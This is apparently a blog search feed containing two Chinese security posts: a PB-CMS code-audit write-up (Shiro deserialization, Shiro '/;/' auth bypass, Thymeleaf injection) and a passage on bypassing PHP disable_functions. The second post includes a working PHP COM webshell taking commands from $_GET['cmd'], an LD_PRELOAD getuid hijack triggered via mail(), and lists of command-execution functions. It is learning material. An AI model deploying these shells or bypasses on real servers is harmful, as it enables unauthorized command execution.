<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PB-CMS代码审计学习</title>
      <link href="/undefined/2497.html"/>
      <url>/undefined/2497.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没更新博客了，感觉学到后面不懂的东西更多，通常学一个东西为了理解它就要学更多的东西，所以越来越不想更新博客了。。。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>项目地址：<a href="https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/">https://gitee.com/LinZhaoguan/pb-cms/tree/v1.0.0/</a></p><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><p>直接来看pom.xml文件，搜到shiro<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318901.png" alt="image-20240319131808830"><br>1.4.1版本，采用的加密模式还是AES-CBC，从1.4.2版本开始采用的是AES-GCM<br>所以直接拿工具一把梭即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318340.png" alt="image-20240319131819286"><br>然后命令执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318307.png" alt="image-20240319131830242"><br>在这里1.4.1版本其实shiro550不能打，打shiro550版本要小于1.2.4。但是在shiro反序列化漏洞修复的时候如果仅对shiro版本升级而没有重新生成密钥那么AES加密的默认密钥硬编码仍然会在代码里面，就会同样存在反序列化风险，这里去看看是否存在<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318699.png" alt="image-20240319131842491"><br>确实存在，位置在<code>src/main/java/com/puboot/common/config/ShiroConfig.java</code><br>搜了一下这里怎么生成一个新的shirokey，可以利用官方提供的方法生成一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.crypto.KeyGenerator;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">KeyGenerator</span> <span class="variable">keygen</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            keygen = KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">deskey</span> <span class="operator">=</span> keygen.generateKey();</span><br><span class="line">        System.out.println(Base64.encodeToString(deskey.getEncoded()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318913.png" alt="image-20240319131852883"><br>每次运行都会得到不一样的key，然后我们替换一下key看还能不能爆破出来<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319040.png" alt="image-20240319131900990"><br>可以看到爆破到天荒地老也没法爆出来除非刚好字典里面有这个key，所以修复用这种方式即可，比如我把刚刚那个密钥加到字典里面可以看到就能爆出来了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319198.png" alt="image-20240319131913155"></p><h2 id="shiro权限绕过"><a href="#shiro权限绕过" class="headerlink" title="shiro权限绕过"></a>shiro权限绕过</h2><p>Shiro 1.5.3版本之前，当shiro和springboot一起使用时可能会导致身份验证绕过<br>漏洞的主要原因就是shiro和spring对路径的解析有差异，下面开始复现<br>我们直接访问<code>/cms/admin</code>时会跳转到登录界面，但是当使用<code>/;/cms/admin</code>时即可跳过认证<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319879.png" alt="image-20240319131920791"><br>这个虽然绕过了但是没啥权限什么都干不了</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这个洞之前没碰过跟着看下代码<br><strong>shiro</strong><br>断点下在<code>org/apache/shiro/web/filter/mgt/PathMatchingFilterChainResolver.java#getChain</code>这里，然后开始调试<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319368.png" alt="image-20240319131933115"><br>可以看到这里通过<code>getPathWithinApplication()</code>方法获取到的<code>requestURI</code>只有一个<code>/</code>跟进去分析一下，来到<code>getPathWithinApplication()</code>方法下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319335.png" alt="image-20240319131941180"><br>可以看到这里调用了<code>getRequestUri()</code>方法后<code>requestUri</code>就已经变成了<code>/</code>最后也就是返回的这个，那么继续跟进<code>getRequestUri()</code>方法看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319867.png" alt="image-20240319131956696"><br>从这里的英文注释中可以看到这个函数的功能就是截取分号之前的东西，但是还是看一下具体的处理逻辑，跟进<code>decodeAndCleanUriString()</code>方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320163.png" alt="image-20240319132012022"><br>这里可以看到<code>uri.indexOf(&#39;;&#39;)</code>会获取到分号的位置然后赋值给<code>semicolonIndex</code>最后截取0到分号的位置的东西返回，然后继续往下，会拿着<code>pathPattern</code>去匹配鉴权规则<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320599.png" alt="image-20240319132021465"><br>然后匹配不上返回null<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320713.png" alt="image-20240319132028565"><br>因为上面这里返回null，前面匹配不上路径对应的鉴权模式，所以不会设置匹配到的鉴权对于的FIlter。跟着调用<code>chain.doFilter</code>,从而实现绕过<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320571.png" alt="image-20240319132049315"><br>这里走完之后就会去到spring的url处理<br><strong>spring</strong><br>断点下在<code>org.springframework.web.util.UrlPathHelper.java#getPathWithinServletMapping</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321074.png" alt="image-20240319132059770"><br>然后调试一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321312.png" alt="image-20240319132113027"><br>这里可以看到<code>getPathWithinApplication()</code>处理之后<code>pathWithinApp</code>就已经变为了<code>/cms/admin</code>了所以跟进上面那个函数看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321605.png" alt="image-20240319132125424"><br>到这里似乎和shiro是一样的函数，所以直接跟进去看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321898.png" alt="image-20240319132144687"><br>来到这里继续跟进<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321827.png" alt="image-20240319132156670"><br>这里三步可以看到先过滤了分号然后过滤了重复的<code>/</code>得到<code>/cms/admin</code>，spring能正常处理这个url所以实现了绕过，如果没有加分号这里得到的就是login<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322841.png" alt="image-20240319132215600"><br>这里看了很多分析文章，最终的总结就是url进入tomcat后tomcat判断<code>/;/cms/admin</code>cms下的admin，进入到shiro时<code>;</code>后面被截断变为<code>/</code>，绕过鉴权，此时再进入spring时又被理解为<code>/cms/admin</code>最终导致shiro权限的绕过，这块看了很多文章只能勉强理解到这里了，再深入感觉得去看shiro的鉴权规则</p><h2 id="SSRF结合Fastjson"><a href="#SSRF结合Fastjson" class="headerlink" title="SSRF结合Fastjson"></a>SSRF结合Fastjson</h2><p>新知识点，学习一下<br>登录后台发现本来的功能是这样的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322640.png" alt="image-20240319132227586"><br>然后来到数据库中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322952.png" alt="image-20240319132239913"><br>发现这里多了个点，不知道是作者有意这样写的还是怎么，当去掉这个点后会发现上面那个文章列表多了一个功能？自己去弄了下发现并没有啊，是我操作有问题？不知道这个wsyu9a师傅怎么弄的，本来想手动学习一下的，无奈只能看看了</p><h2 id="Thymeleaf模板注入漏洞"><a href="#Thymeleaf模板注入漏洞" class="headerlink" title="Thymeleaf模板注入漏洞"></a>Thymeleaf模板注入漏洞</h2><p>Thymeleaf的模板注入之前没接触过，但是应该和其它的模板注入差不多，这个洞已经被提了issues<br><a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I51W2D">pb-cms存在后台命令执行漏洞 · Issue #I51W2D · LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>这里先看看引起漏洞的情况<br><strong>第一种</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  lang ; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，模板的路径可控，这里如果输入的是<code>/path?lang=en</code>就会去寻找en.html这个模板，找到就显示，没找到就报错，但是如果我们输入的是spel表达式就会被解析执行，所以这个漏洞的本质还是spel表达式注入，和ssti还是不一样<br><strong>第二种</strong><br>controller无返回值，则以GetMapping的路由为视图名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;  </span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种就不能有返回值，有了反而不会导致代码执行，这个要执行是要调用到<code>applyDefaultViewName</code>方法，里面会判断当<code>ModelAndView</code>为空，则通过<code>getDefaultViewName</code>获取请求路径作为<code>ViewName</code>，更详细的就不看了，这个漏洞还有待更深入的学习<br>回归漏洞，先复现一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317109.png"><br>在主题管理这里新增个主题，然后启用访问前台即可触发<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317240.png"></p><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>来到如下位置下断点调试一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191037209.png"><br>可以看到这里和我们第一种情况的写法基本一样，这里通过，<code>bizThemeService.selectCurrent().getName()</code>获取到我们的输入然后返回造成了模板注入<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317623.png"><br>感觉这个审出来也挺猛，为什么就能看出来那个是我们后台可控的呢？<br>我尝试自己跟一下看看，找了半天终于在下面这里找打新增主题了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317754.png"><br>这个时候可以看到我们的参数已经被传进来了，就在<code>bizTheme</code>这个里面，所以还得继续往前推进，在这个BizTheme类下找到定义的参数<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317633.png"><br>里面有个<code>@Data</code>注解相当于有getter和setter了实例化的时候就会自动赋值了，然后结合上面的<code>@PostMapping</code>注解即可理解为可控，看看GPT怎么说的，根据Spring MVC的工作原理，当接收到一个POST请求时，Spring会尝试将请求体中的数据映射到方法的参数上，所以这里可控</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>稍微学习了一下新洞，后面还有个文件上传不知道是不是我找的接口不对没能利用成功，想学习的师傅可以参考<a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR">File upload vulnerability · Issue #I8T4WR · LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>这个issue自己去理解一下</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1592/">https://tttang.com/archive/1592/</a><br><a href="https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/">https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/</a><br><a href="https://www.cnblogs.com/TT0TT/p/16845759.html">模板注入–Spring boot Thymeleaf 模板注入 - TT0TT - 博客园 (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>disable_functions绕过总结</title>
      <link href="/undefined/56078.html"/>
      <url>/undefined/56078.html</url>
      
        <content type="html"><![CDATA[<h2 id="黑名单绕过（常规手段）"><a href="#黑名单绕过（常规手段）" class="headerlink" title="黑名单绕过（常规手段）"></a>黑名单绕过（常规手段）</h2><p>这个绕过就是利用黑名单之外的函数去执行命令，但是我在测试这个黑名单绕过的时候发现了一个很迷惑的点，在Windows下我禁用了eval和system函数hackbar确实不能执行system函数了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061648901.png" alt="image-20231206164832783"><br>但是蚁剑上面任然可以命令执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649793.png" alt="image-20231206164914744"><br>另外eval函数也任然可以执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649600.png" alt="image-20231206164939494"><br>岂不是相当于禁用eval函数没用？？这个时候的php版本为5.4.45，然后是Linux下的测试，我也禁用了eval、system做测试，eval函数照样正常执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649382.png" alt="image-20231206164953272"><br>然后尝试system函数<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650540.png" alt="image-20231206165006450"><br>然后尝试用以蚁剑去执行命令<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650970.png"><br>蚁剑还是可以正常执行命令，然后我再网上找了一下经常禁掉的函数全部加上去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,passthru,popen,shell_exec,proc_open,proc_terminate,curl_exec,curl_multi_exec,show_source,touch,escapeshellcmd,escapeshellarg,<span class="keyword">eval</span>,system</span><br></pre></td></tr></table></figure><p>此时蚁剑无法正常命令执行了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650948.png"><br>然后我在Windows下也加上那一堆函数，然后蚁剑此时也无法正常命令执行了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650485.png" alt="image-20231206165049441"><br>然后把system放出来之后可以正常执行命令，此时就猜测蚁剑的那个终端的命令执行当system用不了的时候会去尝试用其它的函数执行命令，应该是内置了一堆命令执行的函数，没有研究过蚁剑的源码，但是我觉得我的猜测八九不离十，但是对于那个eval函数的禁用还是没懂为什么禁用不了，难道是因为无法做命令执行只能执行某个函数所以不限制？？<br>上面的疑惑结束，这个部分的黑名单绕过也就是找一些没有被办掉可以命令执行的函数，当然只能利用hackbar在网页上执行，因为蚁剑里面不一定内置了那个函数无法使用终端去执行命令，参考<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">l3m0n&#x2F;Bypass_Disable_functions_Shell: 一个各种方式突破Disable_functions达到命令执行的shell (github.com)</a>该项目，一般的禁用列表如下，可以从这个里面找漏网之鱼，如果有再去找函数的详细用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>一般直接命令执行的函数就下面几个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec、shell_exec、system、passthru、popen、proc_open</span><br></pre></td></tr></table></figure><h2 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h2><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul><li>phpinfo()中能搜到com.allow_dcom，即做了配置，默认没做<br>这个组件默认是没有做配置的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651807.png" alt="image-20231206165114747"><br>需要加上<code>extension=php_com_dotnet.dll</code>，然后将<code>com.allow_dcom = true</code>前面的分号去掉<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651356.png" alt="image-20231206165131300"><br>这样配置后即可在phpinfo中搜到<code>com.allow_dcom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651232.png" alt="image-20231206165142182"><br>如果一台Windows服务器做了这个配置，那么就可以利用这个来绕过，即创建一个COM对象,通过调用COM对象的<code>exec</code>替我们执行命令，上传如下代码即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651556.png" alt="image-20231206165154479"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;wsh&#x27;</span>] : <span class="string">&#x27;wscript&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;wscript&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Create Wscript.Shell Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">    <span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">    <span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$wsh</span> == <span class="string">&#x27;application&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$wshit</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&quot;Shell.Application&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Shell.Application Failed!&quot;</span>);</span><br><span class="line">    <span class="variable">$exec</span> = <span class="variable">$wshit</span>-&gt;<span class="title function_ invoke__">ShellExecute</span>(<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c &quot;</span>.<span class="variable">$command</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652699.png" alt="image-20231206165205647"><br>这个利用的是COM下的exec直接来命令执行，至于怎么利用的可以参考<a href="https://learn.microsoft.com/zh-cn/windows/win32/com/com-technical-overview">COM 技术概述 - Win32 apps | Microsoft Learn</a>我这里就不研究了</li></ul><h2 id="利用Linux环境变量LD-PRELOAD"><a href="#利用Linux环境变量LD-PRELOAD" class="headerlink" title="利用Linux环境变量LD_PRELOAD"></a>利用Linux环境变量LD_PRELOAD</h2><p>感觉这个是面试或者CTF里面考的最多的，先看一下LD_PRELOAD是什么<br>摘抄，感觉解释的挺好</p><blockquote><p>LD_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。<br>也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。</p></blockquote><p>即LD_PRELOAD是设置你某个程序运行时去哪加载你的动态链接库的一个环境变量，既然可以自己指定这个路径那么就有操作的空间了，就可以自己设置个恶意的程序路径</p><p>动态链接库又是什么呢，继续摘抄</p><blockquote><p>简单来说一个正常程序在运行时会调用不同的链接，比如c，调用h，也可以直接调用so（win的话就是dll），这些链接库去使用他们的库</p></blockquote><p>感觉就是在运行C或者python时你指定一个头文件或者库，然后就可以调用里面的函数，动态就是在你运行这个程序时去调用，这样理解应该没错<br>概念差不多了，下面看怎么利用这个</p><h3 id="基本演示"><a href="#基本演示" class="headerlink" title="基本演示"></a>基本演示</h3><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>这里拿id命令来看一下LD_PERLOAD的基本用法吧<br>利用下面命令查看一下id底层调用了哪些函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -Ws /usr/bin/id</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061652560.png" alt="image-20231206165223464"><br>其中就使用了getuid这个函数，但是找了半天这个函数的原本代码没找到，不知道怎么找，麻了。。。先放着继续往下<br>下面生成一个.so文件，先写个.c原本的getuid函数应该不是这样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getuid</span><span class="params">()</span>&#123;        </span><br><span class="line">  <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)&#123;        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;        </span><br><span class="line">  &#125;        </span><br><span class="line">  unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);#解除捆绑，否则容易出现死循环的奇怪状况        </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success\n&quot;</span>);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译为.so文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o test</span><br><span class="line">gcc --share test -o test.so</span><br></pre></td></tr></table></figure><p>再设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_PRELOAD=./test.so</span><br></pre></td></tr></table></figure><p>然后执行id可以看到printf先被执行了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653723.png" alt="image-20231206165347655"><br>弄完这个之后我纠结了很久怎么去找到getuid的源码，但后面发现其实不找到源码也是可以的，因为你写的那个getuid当id命令执行的时候去加载不会管你里面怎么执行的，只会去对应参数，参数写对了即可，没写对的话报错也会给你报出来正确的应该怎么写，如执行ls时调用的<code>strncmp()</code>函数，看下面博主的图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061653257.png" alt="image-20231206165356149"></p><h3 id="实战php中怎么利用"><a href="#实战php中怎么利用" class="headerlink" title="实战php中怎么利用"></a>实战php中怎么利用</h3><p>上面是在测试这个方法的基本使用，利用的是Linux中的id命令会调用的外部程序来做测试，下面就需要寻找在php中哪些函数会启动一个新进程，即调用外部函数，只要启动新进程即可利用，无所谓是哪个函数<br>根据前辈们的经验常用的有mail()、error_log()函数，两个函数在调用时都会启动一个新的进程<code>/usr/sbin/sendmail</code>，当然这里sendmail默认是没有安装的，可以自行安装一下<code>apt-get install sendmail</code>，失败的话执行一下<code>apt-get update</code>即可，另外imap_mail()函数也会启动一个新进程大概率也是可行的，</p><p>这里就只测试mail()函数，它启动的新进程中sendmail里面也会调用getuid函数，所以继续劫持这个getuid即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654263.png" alt="image-20231206165417218"><br>然后编写个mail.php代码去调用mail函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/home/joker27/tmp/test.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后和.so文件放在一起<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654099.png" alt="image-20231206165434047"><br>上面的.so文件改了一下那个用在这里没有回显<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061654544.png" alt="image-20231206165443493"><br>然后直接访问mail.php即可执行代码，也可以利用文件包含也可执行<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061655303.png" alt="image-20231206165500254"><br>然后这里再贴个可以利用的函数总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mail()</span><br><span class="line">error_log()</span><br><span class="line">mb_send_mail()需要安装mbstring模块，利用与mail()类似</span><br><span class="line">imap_mail()需要安装imap模块</span><br><span class="line">libvirt_connect()需要libvirt模块</span><br><span class="line">gnupg_init()需要gnupg模块</span><br></pre></td></tr></table></figure><p>找了半天终于找到一篇博客，里面一段话让我对这个过程更加的清晰</p><blockquote><p>当系统试图调用某函数时，该函数位于特定的共享库(xxx.so)。因此，系统在调用之前将加载xxx.so。换句话说，如果我可以创建一个evil.so有了同名的函数，就能将其覆盖之。</p></blockquote><p>上面都是劫持的getuid这个函数，需要启动的新进程中有函数去调用它才行，有一定的限制性，下面看怎么突破这个限制<br><strong>劫持共享对象</strong><br>共享对象（Shared Object, SO）即.so文件，上面的是当mail函数启动一个新进程之后会去.so文件即共享对象里面找一些要调用的函数，找到sendmail后sendmail里面再去调用getuid函数，但是sendmail不一定会安装那么劫持getuid也就没有用了，那么有没有一种方法在加载共享对象时就能执行恶意代码，答案肯定是有的，利用<code>__attribute__((constructor))</code>即可，它可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code>修饰的函数<br>这部分的代码就直接用yangyangwithgnu这位佬的代码就行了<br>首先是.c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 